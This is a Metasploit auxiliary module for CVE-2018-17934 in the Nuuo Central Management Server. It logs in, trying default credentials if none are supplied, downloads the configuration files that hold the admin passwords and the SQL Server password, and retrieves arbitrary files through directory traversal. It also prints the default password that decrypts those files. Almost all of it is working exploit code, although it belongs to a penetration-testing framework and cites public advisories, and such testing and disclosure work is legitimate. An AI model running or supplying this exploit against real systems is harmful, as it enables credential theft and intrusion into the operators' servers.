##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::Nuuo
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Nuuo Central Management Server Authenticated Arbitrary File Download',
      'Description'    => %q{
      The Nuuo Central Management Server allows an authenticated user to download files from the
      installation folder. This functionality can be abused to obtain administrative credentials,
      the SQL Server database password and arbitrary files off the system with directory traversal.
      The module will attempt to download CMServer.cfg (the user configuration file with all the user
      passwords including the admin one), ServerConfig.cfg (the server configuration file with the
      SQL Server password) and a third file if the FILE argument is provided by the user.
      The two .cfg files are zip-encrypted files, but due to limitations of the Ruby ZIP modules
      included in Metasploit, these files cannot be decrypted programmatically. The user will
      have to open them with zip or a similar program and provide the default password "NUCMS2007!".
      This module will either use a provided session number (which can be guessed with an auxiliary
      module) or attempt to login using a provided username and password - it will also try the
      default credentials if nothing is provided.
      All versions of CMS server up to and including 3.5 are vulnerable to this attack.
      },
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2018-17934' ],
          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-18-284-02' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2019/Jan/51' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/nuuo-cms-ownage.txt' ]

        ],
      'Platform'        => ['win'],
      'Privileged'      => true,
      'DisclosureDate'  => 'Oct 11 2018'))

    register_options(
      [
        OptString.new('FILE', [false, 'Additional file to download, use ..\\ to traverse directories from \
        the CMS install folder'])
      ])
  end

  def download_file(file_name, ctype='application/zip', decrypt=true)
    dl_file = nucs_download_file(file_name, decrypt)
    file_name = file_name.gsub('..\\', '')

    path = store_loot(file_name, ctype, datastore['RHOST'],
                      dl_file, file_name, "Nuuo CMS #{file_name} downloaded")
    print_good("Downloaded file to #{path}")
  end


  def run
    nucs_login

    unless @nucs_session
      fail_with(Failure::NoAccess, 'Failed to login to Nuuo CMS')
    end

    download_file('CMServer.cfg')
    download_file('ServerConfig.cfg')

    # note that when (if) archive/zip is included in msf, the code in the Nuuo mixin needs to be changed
    # see the download_file method for details
    print_status('The user and server configuration files were stored in the loot database.')
    print_status('The files are ZIP encrypted, and due to the lack of the archive/zip gem,')
    print_status('they cannot be decrypted in Metasploit.')
    print_status('You will need to open them up with zip or a similar utility, and use the')
    print_status('password NUCMS2007! to unzip them.')
    print_status('Annoy the Metasploit developers until this gets fixed!')

    if datastore['FILE']
      filedata = download_file(datastore['FILE'], 'application/octet-stream', false)
    end
  end
end
